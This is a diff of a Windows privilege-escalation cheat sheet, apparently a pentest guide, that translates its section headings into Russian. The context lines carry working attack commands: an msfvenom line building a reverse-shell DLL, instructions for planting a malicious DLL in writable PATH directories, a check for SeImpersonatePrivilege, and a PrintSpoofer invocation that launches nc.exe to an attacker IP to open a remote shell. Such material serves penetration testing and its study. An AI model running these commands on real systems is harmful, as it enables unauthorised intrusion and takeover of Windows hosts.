@@ -206,7 +206,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o evil.dll
 ```
 
-**Поиск доступных на запись каталогов в переменной PATH для подмены DLL (DLL planting).
+Поиск доступных на запись каталогов в переменной PATH для подмены DLL (DLL planting).
 
 ```
 # Check PATH directories for writable locations:
@@ -215,7 +215,7 @@ icacls "C:\some\path\in\PATH"
 # If writable and a service loads a DLL by name → place malicious DLL there
 ```
 
-Check for SeImpersonatePrivilege — common in web service contexts
+Проверка наличия привилегии SeImpersonatePrivilege — часто встречается в контексте веб-служб.
 
 ```
 # Check current privileges:
@@ -224,7 +224,7 @@ whoami /priv
 # Both are Enabled by default for IIS AppPool, SQL Server, network services
 ```
 
-PrintSpoofer — SeImpersonatePrivilege escalation on modern Windows
+PrintSpoofer — повышение привилегий через SeImpersonatePrivilege в современных версиях Windows.
 
 ```
 # PrintSpoofer (Windows 10 / Server 2019):
@@ -233,7 +233,7 @@ PrintSpoofer — SeImpersonatePrivilege escalation on modern Windows
 .\PrintSpoofer.exe -c "C:\Temp\nc.exe <IP> 4444 -e cmd"
 ```
 
-RoguePotato — SeImpersonatePrivilege escalation, newer potato variant
+RoguePotato — повышение привилегий через SeImpersonatePrivilege, более новая разновидность «potato»-эксплойтов.
 
 ```
 # RoguePotato (Windows Server 2019+, Win10):
